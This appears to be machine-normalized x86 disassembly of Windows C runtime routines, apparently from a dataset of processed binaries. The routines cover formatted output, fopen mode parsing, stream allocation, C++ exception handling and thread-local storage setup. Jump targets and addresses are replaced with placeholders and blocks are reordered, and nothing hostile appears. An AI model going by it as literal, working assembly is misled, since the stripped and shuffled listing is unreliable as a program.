mov [ ebp - 0x8 ] eax
test [ ebp - 0x3 ] 0x80
jne r-xdata
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
mov [ ebp - 0x34 ] 0x27
jmp r-xdata
mov ebx [ ebp - 0x4 ]
test bl 0x40
je r-xdata
test [ ebp - 0x4 ] 0x830
jne r-xdata
lea eax [ ebp - 0x4d ]
mov [ ebp - 0xc ] eax
and [ ebp - 0x24 ] 0x0
mov eax ecx
mov ecx [ rw-data ]
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x2c ] 0x1
mov eax ecx
mov ecx [ rw-data ]
mov [ ebp - 0xc ] ecx
test [ ebp - 0x4 ] 0x80
mov [ ebp - 0x10 ] 0x10
je r-xdata
mov esi [ ebp - 0x28 ]
sub esi [ ebp - 0x24 ]
sub esi [ ebp - 0x10 ]
test bl 0xc
jne r-xdata
test bh 0x1
je r-xdata
or [ ebp - 0x4 ] edi
mov eax [ ebp - 0x10 ]
cdq
mov edi edx
mov esi eax
push edi
push esi
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
call sub_40bee0
push edi
push esi
push [ ebp - 0x1c ]
mov ebx eax
add ebx 0x30
push [ ebp - 0x20 ]
call sub_40be70
cmp ebx 0x39
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] edx
jle r-xdata
mov eax [ ebp - 0x20 ]
or eax [ ebp - 0x1c ]
je r-xdata
sub eax ecx
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
sub eax ecx
sar eax 0x1
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x16 ]
push [ ebp + 0x8 ]
push [ ebp - 0x24 ]
push eax
call sub_40812b
add esp 0x10
test bl 0x8
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
push esi
push 0x20
call sub_4080fa
add esp 0x10
test bl 0x1
je r-xdata
mov [ ebp - 0x16 ] 0x2d
jmp r-xdata
mov eax [ ebp - 0xc ]
dec [ ebp - 0xc ]
mov [ eax ] bl
jmp r-xdata
add ebx [ ebp - 0x34 ]
lea eax [ ebp - 0x4d ]
sub eax [ ebp - 0xc ]
inc [ ebp - 0xc ]
test [ ebp - 0x3 ] 0x2
mov [ ebp - 0x10 ] eax
je r-xdata
inc eax
jmp r-xdata
inc eax
inc eax
jmp r-xdata
cmp [ ebp - 0x2c ] 0x0
je r-xdata
test bl 0x4
jne r-xdata
test bl 0x2
je r-xdata
mov [ ebp - 0x16 ] 0x2b
jmp r-xdata
mov [ ebp - 0x24 ] 0x1
mov eax [ ebp - 0x8 ]
dec [ ebp - 0x8 ]
test eax eax
jg r-xdata
mov ecx [ ebp - 0xc ]
cmp [ ecx ] 0x30
jne r-xdata
mov edx esi
dec esi
test edx edx
je r-xdata
mov edx esi
dec esi
test edx edx
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
push [ ebp - 0x10 ]
push [ ebp - 0xc ]
call sub_40812b
add esp 0x10
cmp [ ebp - 0x10 ] 0x0
jle r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
push esi
push 0x30
call sub_4080fa
add esp 0x10
mov [ ebp - 0x16 ] 0x20
dec [ ebp - 0xc ]
inc eax
mov ecx [ ebp - 0xc ]
mov [ ecx ] 0x30
test eax eax
jne r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
push esi
push 0x20
call sub_4080fa
add esp 0x10
mov eax [ ebp - 0x10 ]
mov ebx [ ebp - 0xc ]
lea edi [ eax - 0x1 ]
test [ ebp - 0x4 ] 0x4
je r-xdata
lea ecx [ ebp - 0x14 ]
push ecx
push [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x44 ]
push eax
call sub_40812b
add esp 0x10
mov eax edi
dec edi
test eax eax
jne r-xdata
mov ax [ ebx ]
inc ebx
push eax
lea eax [ ebp - 0x44 ]
push eax
inc ebx
call sub_40a5a0
pop ecx
test eax eax
pop ecx
jle r-xdata
jmp r-xdata
sub_4080c5
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
dec [ ecx + 0x4 ]
js r-xdata
push ecx
push [ ebp + 0x8 ]
call sub_40761f
pop ecx
pop ecx
mov edx [ ecx ]
mov al [ ebp + 0x8 ]
mov [ edx ] al
inc [ ecx ]
movzx eax al
jmp r-xdata
inc [ eax ]
pop ebp
retn
or [ eax ] 0xffffffff
pop ebp
retn
cmp eax 0xffffffff
mov eax [ ebp + 0x10 ]
jne r-xdata
sub_4080fa
push esi
push edi
mov edi [ esp + 0x10 ]
mov eax edi
dec edi
test eax eax
jle r-xdata
pop edi
pop esi
retn
mov esi [ esp + 0x18 ]
mov eax edi
dec edi
test eax eax
jg r-xdata
push esi
push [ esp + 0x18 ]
push [ esp + 0x14 ]
call sub_4080c5
add esp 0xc
cmp [ esi ] 0xffffffff
je r-xdata
sub_40812b
push ebx
mov ebx [ esp + 0xc ]
mov eax ebx
dec ebx
push esi
push edi
test eax eax
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ esp + 0x1c ]
mov esi [ esp + 0x10 ]
mov eax ebx
dec ebx
test eax eax
jg r-xdata
movsx eax [ esi ]
push edi
inc esi
push [ esp + 0x1c ]
push eax
call sub_4080c5
add esp 0xc
cmp [ edi ] 0xffffffff
je r-xdata
sub_40818e
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi [ rw-data ]
push edi
mov edi [ ebp + 0xc ]
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ebx
mov al [ edi ]
cmp al 0x61
je r-xdata
mov ecx 0x109
cmp al 0x72
je r-xdata
push 0x1a4
push [ ebp + 0x10 ]
push ecx
push [ ebp + 0x8 ]
call sub_40bf55
mov ecx eax
add esp 0x10
cmp ecx ebx
jge r-xdata
cmp edx ebx
je r-xdata
xor ecx ecx
or esi 0x1
jmp r-xdata
cmp al 0x77
jne r-xdata
mov eax [ ebp + 0x14 ]
inc [ rw-data ]
mov [ eax + 0xc ] esi
mov [ eax + 0x4 ] ebx
mov [ eax ] ebx
mov [ eax + 0x8 ] ebx
mov [ eax + 0x1c ] ebx
mov [ eax + 0x10 ] ecx
xor eax eax
jmp r-xdata
movsx eax al
cmp eax 0x54
jg r-xdata
push 0x1
pop edx
mov ecx 0x301
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub eax 0x62
je r-xdata
je r-xdata
or esi 0x2
test ch 0xc0
je r-xdata
dec eax
je r-xdata
mov eax 0x1000
test eax ecx
jne r-xdata
sub eax 0x2b
je r-xdata
or ch 0x80
jmp r-xdata
xor edx edx
jmp r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
sub eax 0xb
je r-xdata
or ecx eax
jmp r-xdata
test cl 0x2
jne r-xdata
sub eax 0x19
je r-xdata
mov al [ edi + 0x1 ]
inc edi
cmp al bl
je r-xdata
mov [ ebp - 0x8 ] 0x1
or esi 0x4000
jmp r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
sub eax 0x6
jne r-xdata
and ecx 0xfffffffe
and esi 0xfffffffc
or ecx 0x2
or esi 0x80
jmp r-xdata
test cl 0x40
jne r-xdata
sub eax 0xe
je r-xdata
mov [ ebp - 0x8 ] 0x1
and esi 0xffffbfff
jmp r-xdata
test ch 0xc0
jne r-xdata
or ecx 0x40
jmp r-xdata
cmp [ ebp - 0x4 ] ebx
jne r-xdata
dec eax
jne r-xdata
or ch 0x40
jmp r-xdata
mov [ ebp - 0x4 ] 0x1
or ecx 0x10
jmp r-xdata
cmp [ ebp - 0x4 ] ebx
jne r-xdata
mov [ ebp - 0x4 ] 0x1
or ecx 0x20
jmp r-xdata
sub_4082fe
push ebx
push esi
push edi
push 0x2
xor ebx ebx
xor edi edi
call sub_406d15
xor esi esi
cmp [ rw-data ] ebx
pop ecx
jle r-xdata
push 0x2
call sub_406d76
pop ecx
mov eax edi
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
cmp eax ebx
je r-xdata
push 0x38
shl esi 0x2
call sub_40734d
pop ecx
mov ecx [ rw-data ]
mov [ esi + ecx ] eax
mov eax [ rw-data ]
mov eax [ esi + eax ]
cmp eax ebx
je r-xdata
test [ eax + 0xc ] 0x83
jne r-xdata
add eax 0x20
push eax
call [ InitializeCriticalSection@IAT ]
mov eax [ rw-data ]
mov eax [ esi + eax ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
mov eax [ rw-data ]
mov edi [ esi + eax ]
inc esi
cmp esi [ rw-data ]
jl r-xdata
push eax
push esi
call sub_406371
pop ecx
pop ecx
mov ecx [ rw-data ]
mov eax [ ecx + esi * 4 ]
test [ eax + 0xc ] 0x83
je r-xdata
or [ edi + 0x10 ] 0xffffffff
mov [ edi + 0x4 ] ebx
mov [ edi + 0xc ] ebx
mov [ edi + 0x8 ] ebx
mov [ edi ] ebx
mov [ edi + 0x1c ] ebx
jmp r-xdata
mov edi [ ecx + esi * 4 ]
jmp r-xdata
push eax
push esi
call sub_4063c3
pop ecx
pop ecx
cmp edi ebx
je r-xdata
sub_4083c6
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x18 ]
push edi
mov edi 0x19930520
cmp [ esi ] edi
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x66
je r-xdata
call sub_408d5b
cmp [ esi + 0xc ] 0x0
je r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
push 0x1
pop eax
cmp [ eax ] 0xe06d7363
jne r-xdata
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x24 ]
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_408461
add esp 0x20
cmp [ eax + 0x14 ] edi
jbe r-xdata
push 0xffffffff
push esi
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_40871b
add esp 0x10
jmp r-xdata
mov ecx [ eax + 0x1c ]
mov ecx [ ecx + 0x8 ]
test ecx ecx
je r-xdata
movzx edx [ ebp + 0x24 ]
push edx
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call ecx
add esp 0x20
jmp r-xdata
pop edi
pop esi
pop ebp
retn
sub_408461
push ebp
mov ebp esp
sub esp 0x18
mov eax [ ebp + 0xc ]
and [ ebp - 0x14 ] 0x0
mov eax [ eax + 0x8 ]
cmp eax 0xffffffff
mov [ ebp - 0x10 ] eax
jl r-xdata
call sub_408d5b
mov ecx [ ebp + 0x18 ]
cmp eax [ ecx + 0x4 ]
jl r-xdata
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
cmp [ esi + 0x10 ] 0x3
jne r-xdata
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov ebx 0xe06d7363
push edi
mov edi 0x19930520
cmp [ esi ] ebx
jne r-xdata
jmp sub_408cfa
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp - 0x10 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_408614
add esp 0x20
jmp r-xdata
cmp [ esi ] ebx
jne r-xdata
cmp [ esi + 0x14 ] edi
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp [ esi + 0x10 ] 0x3
jne r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
cmp [ esi + 0x14 ] edi
jne r-xdata
call sub_408c93
cmp [ eax + 0x6c ] 0x0
je r-xdata
mov edi [ ebp - 0x10 ]
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push edi
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
call sub_40571b
add esp 0x14
mov ebx eax
call sub_408c93
mov esi [ eax + 0x6c ]
call sub_408c93
mov eax [ eax + 0x70 ]
push 0x1
push esi
mov [ ebp + 0x10 ] eax
mov [ ebp - 0x14 ] 0x1
call sub_40c224
pop ecx
test eax eax
pop ecx
jne r-xdata
cmp [ ebp + 0x1c ] 0x0
je r-xdata
cmp [ ebx ] edi
jg r-xdata
cmp [ esi ] ebx
jne r-xdata
call sub_408d5b
push 0x1
push esi
call sub_408b53
pop ecx
pop ecx
inc [ ebp - 0x4 ]
add ebx 0x14
jmp r-xdata
cmp edi [ ebx + 0x4 ]
jg r-xdata
cmp [ esi + 0x10 ] 0x3
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x18 ]
jae r-xdata
mov eax [ ebx + 0x10 ]
mov [ ebp + 0x8 ] eax
mov eax [ ebx + 0xc ]
test eax eax
mov [ ebp - 0xc ] eax
jle r-xdata
cmp [ esi + 0x14 ] edi
jne r-xdata
mov edi [ ebp - 0x10 ]
mov eax [ esi + 0x1c ]
mov eax [ eax + 0xc ]
lea edi [ eax + 0x4 ]
mov eax [ eax ]
test eax eax
mov [ ebp - 0x8 ] eax
jle r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
dec [ ebp - 0xc ]
add [ ebp + 0x8 ] 0x10
cmp [ ebp - 0xc ] 0x0
jg r-xdata
push [ esi + 0x1c ]
push [ edi ]
push [ ebp + 0x8 ]
call sub_4086be
add esp 0xc
test eax eax
jne r-xdata
call sub_408d5b
jmp r-xdata
push [ ebp - 0x14 ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push ebx
push [ edi ]
push [ ebp + 0x8 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_4087cf
add esp 0x2c
dec [ ebp - 0x8 ]
add edi 0x4
cmp [ ebp - 0x8 ] eax
jg r-xdata
sub_408614
push ebp
mov ebp esp
push ecx
push ecx
push esi
push edi
call sub_408c93
cmp [ eax + 0x68 ] 0x0
je r-xdata
mov edi [ ebp + 0x1c ]
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push edi
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
call sub_40571b
add esp 0x14
mov esi eax
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4055f0
add esp 0x1c
test eax eax
jne r-xdata
pop edi
pop esi
leave
retn
cmp edi [ esi ]
jl r-xdata
inc [ ebp - 0x4 ]
add esi 0x14
jmp r-xdata
cmp edi [ esi + 0x4 ]
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x8 ]
jae r-xdata
mov eax [ esi + 0xc ]
mov ecx [ esi + 0x10 ]
shl eax 0x4
add eax ecx
mov ecx [ eax - 0xc ]
test ecx ecx
je r-xdata
push 0x1
add eax 0xfffffff0
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push esi
push 0x0
push eax
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4087cf
add esp 0x2c
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
sub_4086be
push esi
push edi
mov edi [ esp + 0xc ]
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
push 0x1
pop eax
cmp [ eax + 0x8 ] 0x0
lea edx [ eax + 0x8 ]
je r-xdata
mov esi [ esp + 0x10 ]
mov ecx [ esi + 0x4 ]
cmp eax ecx
je r-xdata
test [ esi ] 0x2
je r-xdata
add ecx 0x8
push ecx
push edx
call sub_407490
pop ecx
test eax eax
pop ecx
jne r-xdata
mov eax [ esp + 0x14 ]
mov eax [ eax ]
test al 0x1
je r-xdata
test [ edi ] 0x8
je r-xdata
xor eax eax
jmp r-xdata
test al 0x2
je r-xdata
test [ edi ] 0x1
je r-xdata
pop edi
pop esi
retn
test [ edi ] 0x2
jne r-xdata
sub_40871b
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov ebx [ ebp + 0x8 ]
mov esi [ ebx + 0x8 ]
mov [ ebp - 0x1c ] esi
mov edi [ ebp + 0x10 ]
mov [ ebx + 0x8 ] esi
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
cmp esi 0xffffffff
jle r-xdata
call sub_408d5b
cmp esi [ edi + 0x4 ]
jl r-xdata
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
push 0x103
push ebx
push eax
call sub_408be0
and [ ebp - 0x4 ] 0x0
mov eax [ edi + 0x8 ]
mov eax [ eax + esi * 8 + 0x4 ]
test eax eax
je r-xdata
mov eax [ edi + 0x8 ]
mov esi [ eax + esi * 8 ]
mov [ ebp - 0x1c ] esi
jmp r-xdata
cmp esi [ ebp + 0x14 ]
je r-xdata
sub_4087cf
push ebp
mov ebp esp
cmp [ ebp + 0x20 ] 0x0
push ebx
mov ebx [ ebp + 0x1c ]
push esi
push edi
mov edi [ ebp + 0xc ]
je r-xdata
cmp [ ebp + 0x2c ] 0x0
push [ ebp + 0x8 ]
jne r-xdata
push [ ebp + 0x20 ]
push ebx
push edi
push [ ebp + 0x8 ]
call sub_40898f
add esp 0x10
push [ ebp + 0x2c ]
push edi
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push edi
push eax
call sub_4054b0
call sub_4054f2
mov esi [ ebp + 0x24 ]
push [ esi ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push edi
call sub_40871b
mov eax [ esi + 0x4 ]
push 0x100
push [ ebp + 0x28 ]
inc eax
mov [ edi + 0x8 ] eax
push [ ebx + 0xc ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push edi
push [ ebp + 0x8 ]
call sub_40884a
add esp 0x2c
test eax eax
je r-xdata
sub_40884a
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x1c
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov ebx [ ebp + 0x18 ]
mov [ ebp - 0x2c ] ebx
and [ ebp - 0x24 ] 0x0
mov esi [ ebp + 0xc ]
mov eax [ esi - 0x4 ]
mov [ ebp - 0x28 ] eax
call sub_408c93
mov eax [ eax + 0x6c ]
mov [ ebp - 0x1c ] eax
call sub_408c93
mov eax [ eax + 0x70 ]
mov [ ebp - 0x20 ] eax
call sub_408c93
mov edi [ ebp + 0x8 ]
mov [ eax + 0x6c ] edi
call sub_408c93
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x70 ] ecx
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x4 ] 0x1
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push ebx
push [ ebp + 0x14 ]
push esi
call sub_405577
add esp 0x14
mov [ ebp - 0x2c ] eax
and [ ebp - 0x4 ] 0x0
or [ ebp - 0x4 ] 0xffffffff
call sub_408917
mov eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_408917
mov eax [ ebp - 0x28 ]
mov [ esi - 0x4 ] eax
call sub_408c93
mov ecx [ ebp - 0x1c ]
mov [ eax + 0x6c ] ecx
call sub_408c93
mov ecx [ ebp - 0x20 ]
mov [ eax + 0x70 ] ecx
cmp [ edi ] 0xe06d7363
jne r-xdata
retn
cmp [ edi + 0x10 ] 0x3
jne r-xdata
cmp [ edi + 0x14 ] 0x19930520
jne r-xdata
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
cmp [ ebp - 0x2c ] 0x0
je r-xdata
call sub_405842
push eax
push edi
call sub_408b53
pop ecx
pop ecx
sub_408965
mov eax [ esp + 0x4 ]
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x10 ] 0x3
jne r-xdata
cmp [ eax + 0x14 ] 0x19930520
jne r-xdata
cmp [ eax + 0x1c ] 0x0
jne r-xdata
push 0x1
pop eax
retn
sub_40898f
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov ecx [ ebp + 0x10 ]
mov eax [ ecx + 0x4 ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ecx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0xc ]
lea edi [ eax + edx + 0xc ]
and [ ebp - 0x4 ] 0x0
test [ ecx ] 0x8
je r-xdata
mov esi [ ebp + 0x14 ]
test [ esi ] 0x1
je r-xdata
mov esi [ ebp + 0x8 ]
push 0x1
push [ esi + 0x18 ]
call sub_40c224
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ esi + 0x18 ] 0x0
mov ebx [ ebp + 0x8 ]
push 0x1
push [ ebx + 0x18 ]
jne r-xdata
mov ebx [ ebp + 0x8 ]
push 0x1
push [ ebx + 0x18 ]
call sub_40c224
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_408d5b
push 0x1
push edi
call sub_40c240
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_40c224
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_40c224
pop ecx
pop ecx
test eax eax
je r-xdata
push 0x1
push edi
call sub_40c240
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ esi + 0x18 ]
mov [ edi ] eax
mov ecx [ ebp + 0x14 ]
add ecx 0x8
push ecx
push 0x1
push edi
call sub_40c240
pop ecx
pop ecx
test eax eax
je r-xdata
push 0x1
push edi
call sub_40c240
pop ecx
pop ecx
test eax eax
je r-xdata
push [ esi + 0x14 ]
push [ ebx + 0x18 ]
push edi
call sub_405e00
add esp 0xc
cmp [ esi + 0x14 ] 0x4
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
push [ esi + 0x18 ]
call sub_40c25c
pop ecx
test eax eax
je r-xdata
push [ esi + 0x14 ]
add esi 0x8
push esi
push [ ebx + 0x18 ]
call sub_408bba
pop ecx
pop ecx
push eax
push edi
call sub_405e00
add esp 0xc
jmp r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
test [ esi ] 0x4
je r-xdata
add esi 0x8
push esi
jmp r-xdata
lea eax [ esi + 0x8 ]
push eax
push [ ebx + 0x18 ]
call sub_408bba
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push edi
call sub_4054e4
jmp r-xdata
push 0x1
lea eax [ esi + 0x8 ]
push eax
push [ ebx + 0x18 ]
call sub_408bba
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push edi
call sub_4054eb
jmp r-xdata
push eax
call sub_408bba
pop ecx
pop ecx
mov [ edi ] eax
jmp r-xdata
sub_408b53
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ eax + 0x1c ]
mov ecx [ ecx + 0x4 ]
test ecx ecx
je r-xdata
and [ ebp - 0x4 ] 0x0
push ecx
push [ eax + 0x18 ]
call sub_4054e4
or [ ebp - 0x4 ] 0xffffffff
sub_408bba
mov ecx [ esp + 0x8 ]
push esi
mov esi [ esp + 0x8 ]
mov eax [ ecx ]
mov edx [ ecx + 0x4 ]
add eax esi
test edx edx
jl r-xdata
pop esi
retn
mov esi [ edx + esi ]
mov ecx [ ecx + 0x8 ]
mov ecx [ esi + ecx ]
add ecx edx
add eax ecx
sub_408be0
push ebp
mov ebp esp
sub esp 0x4
push ebx
push ecx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebp
push [ ebp + 0x10 ]
mov ecx [ ebp + 0x10 ]
mov ebp [ ebp - 0x4 ]
call sub_405865
push esi
push edi
call eax
pop edi
pop esi
mov ebx ebp
pop ebp
mov ecx [ ebp + 0x10 ]
push ebp
mov ebp ebx
cmp ecx 0x100
jne r-xdata
push ecx
call sub_405865
pop ebp
pop ecx
pop ebx
leave
retn 0xc
mov ecx 0x2
sub_408c2c
push esi
call sub_406cec
call [ TlsAlloc@IAT ]
cmp eax 0xffffffff
mov [ rw-data ] eax
je r-xdata
xor eax eax
pop esi
retn
push 0x74
push 0x1
call sub_409f6c
mov esi eax
pop ecx
test esi esi
pop ecx
je r-xdata
push esi
push [ rw-data ]
call [ TlsSetValue@IAT ]
test eax eax
je r-xdata
push esi
call sub_408c80
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
push 0x1
mov [ esi ] eax
pop eax
pop esi
retn
sub_408c93
push esi
push edi
call [ GetLastError@IAT ]
push [ rw-data ]
mov edi eax
call [ TlsGetValue@IAT ]
mov esi eax
test esi esi
jne r-xdata
push edi
call [ SetLastError@IAT ]
mov eax esi
pop edi
pop esi
retn
push 0x74
push 0x1
call sub_409f6c
mov esi eax
pop ecx
test esi esi
pop ecx
je r-xdata
push 0x10
call sub_40623d
pop ecx
push esi
push [ rw-data ]
call [ TlsSetValue@IAT ]
test eax eax
je r-xdata
push esi
call sub_408c80
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
jmp r-xdata
sub_408cfa
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor esi esi
mov [ ebp - 0x4 ] esi
call sub_408c93
cmp [ eax + 0x60 ] esi
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
call $+5
jmp r-xdata
mov [ ebp - 0x4 ] 0x1
call sub_408c93
call [ eax + 0x60 ]
mov [ ebp - 0x4 ] esi
jmp r-xdata
push 0xa
call sub_409e19
push 0x16
call sub_40cf5f
pop ecx
pop ecx
push 0x3
call sub_406e4e
sub_408d5b
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
and [ ebp - 0x4 ] 0x0
mov eax [ rw-data ]
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
call $+5
jmp sub_408cfa
mov [ ebp - 0x4 ] 0x1
call eax
jmp r-xdata
and [ ebp - 0x4 ] 0x0
sub_408db1
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi ]
cmp [ eax ] 0xe06d7363
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp [ eax + 0x10 ] 0x3
jne r-xdata
xor eax eax
push eax
call sub_40c25c
test eax eax
pop ecx
je r-xdata
cmp [ eax + 0x14 ] 0x19930520
jne r-xdata
push esi
call [ rw-data ]
jmp r-xdata
jmp sub_408cfa
pop esi
retn 0x4
sub_408e15
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
or eax 0xffffffff
pop esi
retn
test al 0x40
jne r-xdata
test al 0x2
je r-xdata
or al 0x1
test ax 0x10c
mov [ esi + 0xc ] eax
jne r-xdata
or al 0x20
mov [ esi + 0xc ] eax
jmp r-xdata
mov eax [ esi + 0x8 ]
mov [ esi ] eax
push esi
call sub_40a12a
pop ecx
jmp r-xdata
neg eax
sbb eax eax
and eax 0x10
add eax 0x10
or [ esi + 0xc ] eax
and [ esi + 0x4 ] 0x0
cmp eax 0xffffffff
je r-xdata
push [ esi + 0x18 ]
push [ esi + 0x8 ]
push [ esi + 0x10 ]
call sub_408ef1
add esp 0xc
mov [ esi + 0x4 ] eax
test eax eax
je r-xdata
mov edx [ esi + 0xc ]
test dl 0x82
jne r-xdata
cmp [ esi + 0x18 ] 0x200
jne r-xdata
mov ecx [ esi + 0x10 ]
push edi
cmp ecx 0xffffffff
je r-xdata
mov ecx [ esi ]
dec eax
mov [ esi + 0x4 ] eax
movzx eax [ ecx ]
inc ecx
mov [ esi ] ecx
pop esi
retn
mov ecx [ esi + 0xc ]
test cl 0x8
je r-xdata
mov edi rw-data
mov edi ecx
sar edi 0x5
and ecx 0x1f
mov edi [ edi * 4 + rw-data ]
lea ecx [ ecx + ecx * 8 ]
lea edi [ edi + ecx * 4 ]
jmp r-xdata
test ch 0x4
jne r-xdata
or dh 0x20
mov [ esi + 0xc ] edx
mov cl [ edi + 0x4 ]
pop edi
and cl 0x82
cmp cl 0x82
jne r-xdata
mov [ esi + 0x18 ] 0x1000
sub_408ef1
push esi
mov esi [ esp + 0x8 ]
cmp esi [ rw-data ]
jae r-xdata
call sub_406dfe
mov [ eax ] 0x9
call sub_406e07
and [ eax ] 0x0
or eax 0xffffffff
pop esi
retn
mov ecx esi
mov eax esi
sar ecx 0x5
and eax 0x1f
mov ecx [ ecx * 4 + rw-data ]
